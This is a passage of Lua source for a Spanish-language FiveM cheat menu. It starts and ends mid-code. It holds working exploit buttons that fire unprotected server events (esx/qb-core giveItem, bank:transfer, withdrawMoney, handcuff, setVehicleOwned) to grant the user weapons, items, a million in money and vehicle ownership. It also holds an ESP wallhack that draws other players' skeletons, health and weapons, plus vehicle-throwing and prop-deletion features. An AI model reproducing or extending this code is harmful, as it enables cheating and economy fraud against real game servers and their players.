                        "esx:giveInventoryItem", "qb-core:server:giveItem",
                        "bank:transfer", "esx_society:withdrawMoney",
                        "esx_policejob:handcuff", "police:server:CuffPlayer",
                        "esx_vehicleshop:setVehicleOwned", "qb-vehicleshop:server:buyShowroomVehicle"
                    }
                    
                    -- Limpiar items anteriores de triggers si existen
                    local category = nil
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Buscar eventos" then category = cat break end
                    end
                    
                    if category and category.tabs[1] then
                        local items = category.tabs[1].items
                        for i = #items, 2, -1 do table.remove(items, i) end
                    end

                    local function getExploitButtonData(name)
                        local myId = GetPlayerServerId(PlayerId())
                        if name:find("revive") or name:find("Revive") then
                            return "Revivirse (Exploit)", function() TriggerServerEvent(name, myId) end
                        elseif name:find("giveInventoryItem") or name:find("giveItem") then
                            local label = name:find("weapon") and "Darse Armas" or "Darse Items"
                            return label, function() 
                                if name:find("esx") then
                                    TriggerServerEvent(name, myId, "bread", 100)
                                    TriggerServerEvent(name, myId, "weapon_pistol", 1)
                                else
                                    TriggerServerEvent(name, myId, "sandwich", 100)
                                    TriggerServerEvent(name, myId, "weapon_pistol", 1)
                                end
                            end
                        elseif name:find("transfer") or name:find("withdraw") or name:find("Money") then
                            return "Darse 1.000.000$", function() TriggerServerEvent(name, myId, 1000000) end
                        elseif name:find("handcuff") or name:find("Cuff") then
                            return "Esposarse/Desesposarse", function() TriggerServerEvent(name, myId) end
                        elseif name:find("setVehicleOwned") or name:find("buyShowroomVehicle") then
                            return "Hacer vehiculo propio", function() 
                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                if veh ~= 0 then
                                    local plate = GetVehicleNumberPlateText(veh)
                                    TriggerServerEvent(name, plate)
                                else
                                    TriggerEvent('chat:addMessage', {args = {"~r~Debes estar en un vehiculo"}})
                                end
                            end
                        else
                            return "Explotar: " .. name, function() TriggerServerEvent(name) end
                        end
                    end

                    for _, trigger in ipairs(commonTriggers) do
                        Citizen.Wait(150)
                        table.insert(TriggersEncontrados, trigger)
                        if category and category.tabs[1] then
                            local btnLabel, btnAction = getExploitButtonData(trigger)
                            table.insert(category.tabs[1].items, {
                                name = btnLabel,
                                type = "action",
                                onClick = function()
                                    btnAction()
                                    TriggerEvent('chat:addMessage', {args = {"~g~Accion ejecutada: " .. btnLabel}})
                                end
                            })
                        end
                    end
                    TriggerEvent('chat:addMessage', {args = {"~g~Busqueda completada. Triggers añadidos al menu."}})
                end)
            end }
        }}
    }},
    { name = "Ajustes", icon = "⚙", hasTabs = true, tabs = {
        { name = "Teclas rapidas", items = {
            { name = "Cambiar tecla de menu", type = "action" },
            { name = "Mostrar teclas rapidas", type = "toggle", value = false }
        }},
        { name = "Configuracion", items = {
            { name = "Crear configuracion", type = "action" },
            { name = "Cargar configuracion", type = "action" }
        }}
    }}
}

if Menu.ApplyTheme then
    Menu.ApplyTheme("Rojo")
end

Menu.Visible = false

Menu.SelectedPlayer = nil
Menu.SelectedPlayers = {}
Menu.PlayerListSelectIndex = 1
Menu.PlayerListTeleportIndex = 1
Menu.PlayerListTypeIndex = 1
Menu.PlayerListSpectateEnabled = false
Menu.StaffModeEnabled = false
Menu.DisableWeaponDamage = false
Menu.WeaponDamageHookSet = false

local Bones = {
    Pelvis = 11816,
    SKEL_Head = 31086,
    SKEL_Neck_1 = 39317,
    SKEL_L_Clavicle = 64729,
    SKEL_L_UpperArm = 45509,
    SKEL_L_Forearm = 61163,
    SKEL_L_Hand = 18905,
    SKEL_R_Clavicle = 10706,
    SKEL_R_UpperArm = 40269,
    SKEL_R_Forearm = 28252,
    SKEL_R_Hand = 57005,
    SKEL_L_Thigh = 58271,
    SKEL_L_Calf = 63931,
    SKEL_L_Foot = 14201,
    SKEL_R_Thigh = 51826,
    SKEL_R_Calf = 36864,
    SKEL_R_Foot = 52301,
}

local SkeletonConnections = {
    {Bones.Pelvis, Bones.SKEL_Neck_1},
    {Bones.SKEL_Neck_1, Bones.SKEL_Head},
    {Bones.SKEL_Neck_1, Bones.SKEL_L_Clavicle},
    {Bones.SKEL_L_Clavicle, Bones.SKEL_L_UpperArm},
    {Bones.SKEL_L_UpperArm, Bones.SKEL_L_Forearm},
    {Bones.SKEL_L_Forearm, Bones.SKEL_L_Hand},
    {Bones.SKEL_Neck_1, Bones.SKEL_R_Clavicle},
    {Bones.SKEL_R_Clavicle, Bones.SKEL_R_UpperArm},
    {Bones.SKEL_R_UpperArm, Bones.SKEL_R_Forearm},
    {Bones.SKEL_R_Forearm, Bones.SKEL_R_Hand},
    {Bones.Pelvis, Bones.SKEL_L_Thigh},
    {Bones.SKEL_L_Thigh, Bones.SKEL_L_Calf},
    {Bones.SKEL_L_Calf, Bones.SKEL_L_Foot},
    {Bones.Pelvis, Bones.SKEL_R_Thigh},
    {Bones.SKEL_R_Thigh, Bones.SKEL_R_Calf},
    {Bones.SKEL_R_Calf, Bones.SKEL_R_Foot},
}

local ESPColors = {
    {1.0, 1.0, 1.0},
    {1.0, 0.0, 0.0},
    {0.0, 1.0, 0.0},
    {0.0, 0.0, 1.0},
    {1.0, 1.0, 0.0},
    {1.0, 0.0, 1.0},
    {0.0, 1.0, 1.0},
}

local function GetWeaponNameFromHash(weaponHash)
    local weaponHashToName = {
        [GetHashKey("WEAPON_UNARMED")] = "Desarmado",
        [GetHashKey("WEAPON_KNIFE")] = "Cuchillo",
        [GetHashKey("WEAPON_BAT")] = "Bate",
        [GetHashKey("WEAPON_CROWBAR")] = "Palanca",
        [GetHashKey("WEAPON_GOLFCLUB")] = "Palo de golf",
        [GetHashKey("WEAPON_HAMMER")] = "Martillo",
        [GetHashKey("WEAPON_HATCHET")] = "Hacha",
        [GetHashKey("WEAPON_KNUCKLE")] = "Punos americanos",
        [GetHashKey("WEAPON_MACHETE")] = "Machete",
        [GetHashKey("WEAPON_SWITCHBLADE")] = "Navaja",
        [GetHashKey("WEAPON_NIGHTSTICK")] = "Porra",
        [GetHashKey("WEAPON_WRENCH")] = "Llave inglesa",
        [GetHashKey("WEAPON_BATTLEAXE")] = "Hacha de batalla",
        [GetHashKey("WEAPON_POOLCUE")] = "Taco de billar",
        [GetHashKey("WEAPON_STONE_HATCHET")] = "Hacha de piedra",
        [GetHashKey("WEAPON_PISTOL")] = "Pistola",
        [GetHashKey("WEAPON_PISTOL_MK2")] = "Pistola MK2",
        [GetHashKey("WEAPON_COMBATPISTOL")] = "Pistola de combate",
        [GetHashKey("WEAPON_PISTOL50")] = "Pistola .50",
        [GetHashKey("WEAPON_SNSPISTOL")] = "Pistola SNS",
        [GetHashKey("WEAPON_SNSPISTOL_MK2")] = "Pistola SNS MK2",
        [GetHashKey("WEAPON_HEAVYPISTOL")] = "Pistola pesada",
        [GetHashKey("WEAPON_VINTAGEPISTOL")] = "Pistola vintage",
        [GetHashKey("WEAPON_FLAREGUN")] = "Lanza bengalas",
        [GetHashKey("WEAPON_MARKSMANPISTOL")] = "Pistola de tirador",
        [GetHashKey("WEAPON_REVOLVER")] = "Revolver pesado",
        [GetHashKey("WEAPON_REVOLVER_MK2")] = "Revolver pesado MK2",
        [GetHashKey("WEAPON_DOUBLEACTION")] = "Revolver de doble accion",
        [GetHashKey("WEAPON_APPISTOL")] = "Pistola AP",
        [GetHashKey("WEAPON_STUNGUN")] = "Taser",
        [GetHashKey("WEAPON_CERAMICPISTOL")] = "Pistola ceramica",
        [GetHashKey("WEAPON_NAVYREVOLVER")] = "Revolver naval",
        [GetHashKey("WEAPON_MICROSMG")] = "Micro SMG",
        [GetHashKey("WEAPON_SMG")] = "SMG",
        [GetHashKey("WEAPON_SMG_MK2")] = "SMG MK2",
        [GetHashKey("WEAPON_ASSAULTSMG")] = "SMG de asalto",
        [GetHashKey("WEAPON_COMBATPDW")] = "PDW de combate",
        [GetHashKey("WEAPON_MACHINEPISTOL")] = "Pistola ametralladora",
        [GetHashKey("WEAPON_MINISMG")] = "Mini SMG",
        [GetHashKey("WEAPON_GUSENBERG")] = "Gusenberg",
        [GetHashKey("WEAPON_PUMPSHOTGUN")] = "Escopeta de bomba",
        [GetHashKey("WEAPON_PUMPSHOTGUN_MK2")] = "Escopeta de bomba MK2",
        [GetHashKey("WEAPON_SAWNOFFSHOTGUN")] = "Escopeta recortada",
        [GetHashKey("WEAPON_ASSAULTSHOTGUN")] = "Escopeta de asalto",
        [GetHashKey("WEAPON_BULLPUPSHOTGUN")] = "Escopeta bullpup",
        [GetHashKey("WEAPON_MUSKET")] = "Mosquete",
        [GetHashKey("WEAPON_HEAVYSHOTGUN")] = "Escopeta pesada",
        [GetHashKey("WEAPON_DBSHOTGUN")] = "Escopeta de dos canones",
        [GetHashKey("WEAPON_AUTOSHOTGUN")] = "Escopeta automatica",
        [GetHashKey("WEAPON_COMBATSHOTGUN")] = "Escopeta de combate",
        [GetHashKey("WEAPON_ASSAULTRIFLE")] = "Fusil de asalto",
        [GetHashKey("WEAPON_ASSAULTRIFLE_MK2")] = "Fusil de asalto MK2",
        [GetHashKey("WEAPON_CARBINERIFLE")] = "Carabina",
        [GetHashKey("WEAPON_CARBINERIFLE_MK2")] = "Carabina MK2",
        [GetHashKey("WEAPON_ADVANCEDRIFLE")] = "Fusil avanzado",
        [GetHashKey("WEAPON_SPECIALCARBINE")] = "Carabina especial",
        [GetHashKey("WEAPON_SPECIALCARBINE_MK2")] = "Carabina especial MK2",
        [GetHashKey("WEAPON_BULLPUPRIFLE")] = "Fusil bullpup",
        [GetHashKey("WEAPON_BULLPUPRIFLE_MK2")] = "Fusil bullpup MK2",
        [GetHashKey("WEAPON_COMPACTRIFLE")] = "Fusil compacto",
        [GetHashKey("WEAPON_MILITARYRIFLE")] = "Fusil militar",
        [GetHashKey("WEAPON_HEAVYRIFLE")] = "Fusil pesado",
        [GetHashKey("WEAPON_TACTICALRIFLE")] = "Fusil tactico",
        [GetHashKey("WEAPON_SNIPERRIFLE")] = "Fusil de francotirador",
        [GetHashKey("WEAPON_HEAVYSNIPER")] = "Francotirador pesado",
        [GetHashKey("WEAPON_HEAVYSNIPER_MK2")] = "Francotirador pesado MK2",
        [GetHashKey("WEAPON_MARKSMANRIFLE")] = "Fusil de tirador",
        [GetHashKey("WEAPON_MARKSMANRIFLE_MK2")] = "Fusil de tirador MK2",
        [GetHashKey("WEAPON_PRECISIONRIFLE")] = "Fusil de precision",
        [GetHashKey("WEAPON_RPG")] = "RPG",
        [GetHashKey("WEAPON_GRENADELAUNCHER")] = "Lanzagranadas",
        [GetHashKey("WEAPON_GRENADELAUNCHER_SMOKE")] = "Lanzagranadas de humo",
        [GetHashKey("WEAPON_MINIGUN")] = "Minigun",
        [GetHashKey("WEAPON_FIREWORK")] = "Lanzacohetes de fuegos artificiales",
        [GetHashKey("WEAPON_RAILGUN")] = "Railgun",
        [GetHashKey("WEAPON_HOMINGLAUNCHER")] = "Lanzamisiles guiados",
        [GetHashKey("WEAPON_COMPACTLAUNCHER")] = "Lanzagranadas compacto",
        [GetHashKey("WEAPON_RAYMINIGUN")] = "Widowmaker",
        [GetHashKey("WEAPON_EMPLAUNCHER")] = "Lanzador EMP compacto",
        [GetHashKey("WEAPON_RAILGUNXM3")] = "Railgun XM3",
    }

    return weaponHashToName[weaponHash] or "Arma desconocida"
end

local function GetESPSettings()
    local settings = {}
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Visuales" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "ESP" and tab.items then
                    for _, item in ipairs(tab.items) do
                        settings[item.name] = item
                    end
                end
            end
        end
    end
    return settings
end

local espSettings = nil

local ESPCache = {}
local ESPCacheTime = 0
local ESPCacheMaxAge = 0.016

local function GetScreenSize()
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        local w, h = Susano.GetScreenWidth(), Susano.GetScreenHeight()
        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end

    local w, h = GetActiveScreenResolution()
    return w, h
end

if not GetScreenCoordFromWorldCoord or type(GetScreenCoordFromWorldCoord) ~= "function" then
    GetScreenCoordFromWorldCoord = function(x, y, z)
        if World3dToScreen2d then
            return World3dToScreen2d(x, y, z)
        else
            return false, 0.0, 0.0
        end
    end
end

local function Draw2DBox(x1, y1, x2, y2, r, g, b, a, screenW, screenH)
    if not Susano.DrawLine then return end

    local w = x2 - x1
    local h = y2 - y1

    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y1 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x1 * screenW, y2 * screenH, x2 * screenW, y2 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x1 * screenW, y1 * screenH, x1 * screenW, y2 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x2 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, r, g, b, a, 1)
end

local function DrawFilledRect(x, y, w, h, r, g, b, a)
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, w, h, r, g, b, a, 0)
    elseif Susano.DrawRect then
        for i = 0, h do
            Susano.DrawRect(x, y + i, w, 1, r, g, b, a)
        end
    end
end

local infiniteStaminaActive = false
local function ToggleInfiniteStamina(enable)
    infiniteStaminaActive = enable
    if enable then
        Citizen.CreateThread(function()
            while infiniteStaminaActive do
                RestorePlayerStamina(PlayerId(), 1.0)
                Citizen.Wait(0)
            end
        end)
    end
end

local function DeleteAllProps()
    local handle, object = FindFirstObject()
    local success
    repeat
        if DoesEntityExist(object) then
            SetEntityAsMissionEntity(object, true, true)
            DeleteObject(object)
        end
        success, object = FindNextObject(handle)
    until not success
    EndFindObject(handle)
end

local throwVehicleActive = false
local function ToggleThrowVehicle(enable)
    throwVehicleActive = enable
    if enable then
        Citizen.CreateThread(function()
            local holdingEntity = false
            local heldEntity = nil

            local function RotationToDirection(rotation)
                local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            while throwVehicleActive do
                Citizen.Wait(0)
                local playerPed = PlayerPedId()
                local screenW, screenH = GetScreenSize()

                if holdingEntity and heldEntity and DoesEntityExist(heldEntity) then
                    if not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Citizen.Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                    end

                    if IsControlJustReleased(0, 38) then
                        local camRot = GetGameplayCamRot(2)
                        local direction = RotationToDirection(camRot)
                        DetachEntity(heldEntity, true, true)
                        ApplyForceToEntity(heldEntity, 1, direction.x * 500.0, direction.y * 500.0, direction.z * 500.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity = false
                        heldEntity = nil
                        ClearPedTasks(playerPed)
                    end

                    if heldEntity and not IsEntityAttached(heldEntity) and holdingEntity then
                        NetworkRequestControlOfEntity(heldEntity)
                        AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                    end
                else
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vector3(camPos.x + direction.x * 300.0, camPos.y + direction.y * 300.0, camPos.z + direction.z * 300.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

                    if hit == 1 and DoesEntityExist(entityHit) then
                        local entityType = GetEntityType(entityHit)
                        if entityType == 2 then
                            local min, max = GetModelDimensions(GetEntityModel(entityHit))
                            local corners = {
                                vector3(min.x, min.y, min.z), vector3(min.x, min.y, max.z),
                                vector3(min.x, max.y, min.z), vector3(min.x, max.y, max.z),
                                vector3(max.x, min.y, min.z), vector3(max.x, min.y, max.z),
                                vector3(max.x, max.y, min.z), vector3(max.x, max.y, max.z)
                            }

                            local minX, minY, maxX, maxY = 1.0, 1.0, 0.0, 0.0
                            local hasScreen = false
                            for _, corner in pairs(corners) do
                                local world = GetOffsetFromEntityInWorldCoords(entityHit, corner.x, corner.y, corner.z)
                                local onScreen, x, y = GetScreenCoordFromWorldCoord(world.x, world.y, world.z)
                                if onScreen then
                                    hasScreen = true
                                    if x < minX then minX = x end
                                    if x > maxX then maxX = x end
                                    if y < minY then minY = y end
                                    if y > maxY then maxY = y end
                                end
                            end

                            if hasScreen then
                                local r, g, b = 255, 0, 0
                                if NetworkHasControlOfEntity(entityHit) then
                                    r, g, b = 0, 255, 0
                                end
                                Draw2DBox(minX, minY, maxX, maxY, r, g, b, 255, screenW, screenH)
                            end

                            if IsControlJustReleased(0, 38) then
                                holdingEntity = true
                                heldEntity = entityHit
                                NetworkRequestControlOfEntity(heldEntity)
                                AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            end
                        end
                    end
                end
            end

            if heldEntity then
                DetachEntity(heldEntity, true, true)
                ClearPedTasks(PlayerPedId())
            end
        end)
    end
end

local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, myPos)
    if not DoesEntityExist(targetPed) then return end

    local targetPos = GetEntityCoords(targetPed)
    local dist = #(myPos - targetPos)

    if dist > 10000.0 then return end

    local cacheKey = tostring(targetPed) .. "_" .. tostring(playerIdx)
    local currentTime = GetGameTimer() or 0
    local cached = ESPCache[cacheKey]
    local onScreen, screenX, screenY

    if cached and (currentTime - cached.time) < 16 then
        onScreen = cached.onScreen
        screenX = cached.screenX
        screenY = cached.screenY
    else
        onScreen, screenX, screenY = GetScreenCoordFromWorldCoord(targetPos.x, targetPos.y, targetPos.z)
        ESPCache[cacheKey] = {
            onScreen = onScreen,
            screenX = screenX,
            screenY = screenY,
            time = currentTime
        }
    end

    if onScreen then

        local drawSkeleton = settings["Dibujar esqueleto"] and settings["Dibujar esqueleto"].value
        local drawBox = settings["Dibujar caja"] and settings["Dibujar caja"].value
        local drawLine = settings["Dibujar linea"] and settings["Dibujar linea"].value
        local drawHealth = settings["Mostrar salud"] and settings["Mostrar salud"].value
        local drawArmor = settings["Mostrar armadura"] and settings["Mostrar armadura"].value

        local drawNameItem = settings["Mostrar nombre"]
        local drawName = drawNameItem and drawNameItem.value
        local drawNamePosItem = settings["Posicion del nombre"]
        local drawNamePos = (drawNamePosItem and drawNamePosItem.selected) or 1

        local drawIDItem = settings["Mostrar ID"]
        local drawID = drawIDItem and drawIDItem.value
        local drawIDPosItem = settings["Posicion ID"]
        local drawIDPos = (drawIDPosItem and drawIDPosItem.selected) or 1

        local drawDistItem = settings["Mostrar distancia"]
        local drawDist = drawDistItem and drawDistItem.value
        local drawDistPosItem = settings["Posicion distancia"]
        local drawDistPos = (drawDistPosItem and drawDistPosItem.selected) or 1

        local drawWeaponItem = settings["Mostrar arma"]
        local drawWeapon = drawWeaponItem and drawWeaponItem.value
        local drawWeaponPosItem = settings["Posicion arma"]
        local drawWeaponPos = (drawWeaponPosItem and drawWeaponPosItem.selected) or 1

        local skelColor = ESPColors[1]
        if settings["Color esqueleto"] then skelColor = ESPColors[settings["Color esqueleto"].selected] or skelColor end

        local boxColor = ESPColors[1]
        if settings["Color caja"] then boxColor = ESPColors[settings["Color caja"].selected] or boxColor end

        local lineColor = ESPColors[1]
        if settings["Color linea"] then lineColor = ESPColors[settings["Color linea"].selected] or lineColor end

        local textColor = ESPColors[1]
        if settings["Color texto"] then textColor = ESPColors[settings["Color texto"].selected] or textColor end

        if drawSkeleton then
            local boneCache = {}
            for _, connection in ipairs(SkeletonConnections) do
                local bone1 = connection[1]
                local bone2 = connection[2]

                local pos1 = boneCache[bone1]
                if not pos1 then
                    pos1 = GetPedBoneCoords(targetPed, bone1, 0.0, 0.0, 0.0)
                    boneCache[bone1] = pos1
                end

                local pos2 = boneCache[bone2]
                if not pos2 then
                    pos2 = GetPedBoneCoords(targetPed, bone2, 0.0, 0.0, 0.0)
                    boneCache[bone2] = pos2
                end

                local os1, x1, y1 = GetScreenCoordFromWorldCoord(pos1.x, pos1.y, pos1.z)
                local os2, x2, y2 = GetScreenCoordFromWorldCoord(pos2.x, pos2.y, pos2.z)

                if os1 and os2 and x1 and y1 and x2 and y2 and
                   x1 >= 0 and x1 <= 1 and y1 >= 0 and y1 <= 1 and
                   x2 >= 0 and x2 <= 1 and y2 >= 0 and y2 <= 1 and
                   Susano.DrawLine then

                    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, 0.0, 0.0, 0.0, 1.0, 2)

                    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, skelColor[1], skelColor[2], skelColor[3], 1.0, 1)
                end
            end
        end

        local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
        local footPos = GetEntityCoords(targetPed)
        footPos = vector3(footPos.x, footPos.y, footPos.z - 1.0)

        local headCacheKey = cacheKey .. "_head"
        local footCacheKey = cacheKey .. "_foot"
        local cachedHead = ESPCache[headCacheKey]
        local cachedFoot = ESPCache[footCacheKey]
        local headX, headY, footX, footY

        if cachedHead and (currentTime - cachedHead.time) < 16 then
            headX = cachedHead.x
            headY = cachedHead.y
        else
            local _, hX, hY = GetScreenCoordFromWorldCoord(headPos.x, headPos.y, headPos.z + 0.3)
            headX, headY = hX, hY
            ESPCache[headCacheKey] = {x = headX, y = headY, time = currentTime}
        end

        if cachedFoot and (currentTime - cachedFoot.time) < 16 then
            footX = cachedFoot.x
            footY = cachedFoot.y
        else
            local _, fX, fY = GetScreenCoordFromWorldCoord(footPos.x, footPos.y, footPos.z)
            footX, footY = fX, fY
            ESPCache[footCacheKey] = {x = footX, y = footY, time = currentTime}
        end

        if not headX or not headY or not footX or not footY then return end

        local height = math.abs(headY - footY)
        if height < 0.01 then return end

        local width = height * 0.35

        local boxX1 = headX - width * 0.5
        local boxX2 = headX + width * 0.5
        local boxY1 = headY
        local boxY2 = footY

        if boxY1 > boxY2 then boxY1, boxY2 = boxY2, boxY1 end

        if drawBox and boxX1 and boxX2 and boxY1 and boxY2 then

            Draw2DBox(boxX1 - 0.0005, boxY1 - 0.0005, boxX2 + 0.0005, boxY2 + 0.0005, 0.0, 0.0, 0.0, 1.0, screenW, screenH)

            Draw2DBox(boxX1, boxY1, boxX2, boxY2, boxColor[1], boxColor[2], boxColor[3], 1.0, screenW, screenH)
        end

        if drawLine and Susano.DrawLine and footX and footY then
             Susano.DrawLine(screenW / 2, screenH, footX * screenW, footY * screenH, lineColor[1], lineColor[2], lineColor[3], 1.0, 1)
        end

        local textBuckets = { [2] = "", [3] = "", [4] = "", [5] = "" }

        local function AddToBucket(sel, text)
            if sel > 1 and textBuckets[sel] then
                textBuckets[sel] = textBuckets[sel] .. text .. "\n"
            end
        end

        if drawName then AddToBucket(drawNamePos + 1, GetPlayerName(playerIdx)) end
        if drawID then AddToBucket(drawIDPos + 1, "ID: " .. GetPlayerServerId(playerIdx)) end
        if drawDist then AddToBucket(drawDistPos + 1, math.floor(dist) .. "m") end
        if drawWeapon then
             local _, weaponHash = GetCurrentPedWeapon(targetPed, true)
             local weaponName = GetWeaponNameFromHash(weaponHash)

             AddToBucket(drawWeaponPos + 1, weaponName)
        end

        if Susano.DrawText then
            local function DrawTextWithOutline(x, y, text, size, r, g, b, a)

                Susano.DrawText(x - 1, y - 1, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x, y - 1, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x + 1, y - 1, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x - 1, y, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x + 1, y, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x - 1, y + 1, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x, y + 1, text, size, 0.0, 0.0, 0.0, 1.0)
                Susano.DrawText(x + 1, y + 1, text, size, 0.0, 0.0, 0.0, 1.0)

                Susano.DrawText(x, y, text, size, r, g, b, a)
            end

            if textBuckets[2] ~= "" and boxX1 and boxX2 and boxY1 then
                local textX = (boxX1 + boxX2)/2 * screenW
                local textY = boxY1 * screenH - 15
                DrawTextWithOutline(textX, textY, textBuckets[2], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end

            if textBuckets[3] ~= "" and boxX1 and boxX2 and boxY2 then
                local textX = (boxX1 + boxX2)/2 * screenW
                local textY = boxY2 * screenH + 5
                DrawTextWithOutline(textX, textY, textBuckets[3], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end

            if textBuckets[4] ~= "" and boxX1 and boxY1 then
                local textX = boxX1 * screenW - 50
                local textY = boxY1 * screenH
                DrawTextWithOutline(textX, textY, textBuckets[4], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end

            if textBuckets[5] ~= "" and boxX2 and boxY1 then
                local textX = boxX2 * screenW + 5
                local textY = boxY1 * screenH
                DrawTextWithOutline(textX, textY, textBuckets[5], 14, textColor[1], textColor[2], textColor[3], 1.0)
            end
        end

        if (drawHealth or drawArmor) and boxX1 and boxY1 and boxY2 then
            local barW = 2

            if drawHealth then
                local health = GetEntityHealth(targetPed)
                local maxHealth = GetEntityMaxHealth(targetPed)
                local healthPct = (health - 100) / (maxHealth - 100)
                if healthPct < 0 then healthPct = 0 end
                if healthPct > 1 then healthPct = 1 end

                local barH = (boxY2 - boxY1) * screenH
                if barH > 0 then
                    local barX = (boxX1 * screenW) - (barW + 2)
                    local barY = boxY1 * screenH

                    DrawFilledRect(barX - 1, barY - 1, barW + 2, barH + 2, 0.0, 0.0, 0.0, 1.0)

                    local fillH = barH * healthPct
                    DrawFilledRect(barX, barY + (barH - fillH), barW, fillH, 0.0, 1.0, 0.0, 1.0)
                end
            end

            if drawArmor then
                local armor = GetPedArmour(targetPed)
                local armorPct = armor / 100.0
                if armorPct > 1 then armorPct = 1 end

                if armorPct > 0 then
                    local barH = (boxY2 - boxY1) * screenH
                    if barH > 0 then

                        local offset = (barW + 2)
                        if drawHealth then offset = offset + (barW + 2) end

                        local barX = (boxX1 * screenW) - offset
                        local barY = boxY1 * screenH

                        DrawFilledRect(barX - 1, barY - 1, barW + 2, barH + 2, 0.0, 0.0, 0.0, 1.0)

                        local fillH = barH * armorPct
                        DrawFilledRect(barX, barY + (barH - fillH), barW, fillH, 0.0, 0.0, 1.0, 1.0)
                    end
                end
            end
        end
    end
end

local function GetWorldSettings()
    local settings = {}
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Visuales" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "Mundo" and tab.items then
                    for _, item in ipairs(tab.items) do
                        settings[item.name] = item
                    end
                end
            end
        end
    end
    return settings
end

local worldSettings = nil

local function RenderWorldVisuals(settings)
    if not settings then return end

    Actions.fpsBoostItem = settings["Mejorar FPS"]
    if Actions.fpsBoostItem and Actions.fpsBoostItem.value then
        if OverrideLodscaleThisFrame then OverrideLodscaleThisFrame(0.35) end
        if SetDisableDecalRenderingThisFrame then SetDisableDecalRenderingThisFrame() end

        if Menu.RopeDrawShadowEnabled then Menu.RopeDrawShadowEnabled(false) end
        if CascadeShadowsClearShadow then CascadeShadowsClearShadow() end

        if SetReducePedModelBudget then SetReducePedModelBudget(true) end
        if SetReduceVehicleModelBudget then SetReduceVehicleModelBudget(true) end
        if DisableVehicleDistantlights then DisableVehicleDistantlights(true) end
        if SetDeepOceanScaler then SetDeepOceanScaler(0.0) end
        if SetGrassCullDistanceScale then SetGrassCullDistanceScale(0.0) end
    else
        if Menu.RopeDrawShadowEnabled then Menu.RopeDrawShadowEnabled(true) end
        if SetReducePedModelBudget then SetReducePedModelBudget(false) end
        if SetReduceVehicleModelBudget then SetReduceVehicleModelBudget(false) end
        if DisableVehicleDistantlights then DisableVehicleDistantlights(false) end
        if SetDeepOceanScaler then SetDeepOceanScaler(1.0) end
        if SetGrassCullDistanceScale then SetGrassCullDistanceScale(1.0) end
    end

Actions.blossomItem = FindItem("Ajustes", "General", "Flores")
if Actions.blossomItem then
    Actions.blossomItem.onClick = function(value)
        Menu.ShowBlossoms = value
    end
end

    Actions.timeItem = settings["Hora"]
    Actions.freezeItem = settings["Congelar hora"]

    if Actions.freezeItem and Actions.freezeItem.value then
        if Actions.timeItem then
            NetworkOverrideClockTime(math.floor(Actions.timeItem.value), 0, 0)
        end
    end

    Actions.weatherItem = settings["Clima"]
    if Actions.weatherItem and Actions.weatherItem.options then
        local selectedWeather = Actions.weatherItem.options[Actions.weatherItem.selected]
        if selectedWeather then
             SetWeatherTypeNowPersist(selectedWeather)
        end
    end

    Actions.blackoutItem = settings["Apagon"]
    if Actions.blackoutItem then
        SetBlackout(Actions.blackoutItem.value)
    end
end

local function FindItem(categoryName, tabName, itemName)
    if not Menu or not Menu.Categories or type(Menu.Categories) ~= "table" then
        return nil
    end

    local success, result = pcall(function()
        for _, cat in ipairs(Menu.Categories) do
            if cat and type(cat) == "table" and cat.name == categoryName then
                if cat.tabs and type(cat.tabs) == "table" then
                    for _, tab in ipairs(cat.tabs) do
                        if tab and type(tab) == "table" and tab.name == tabName and tab.items and type(tab.items) == "table" then
                            for _, item in ipairs(tab.items) do
                                if item and type(item) == "table" and item.name == itemName then
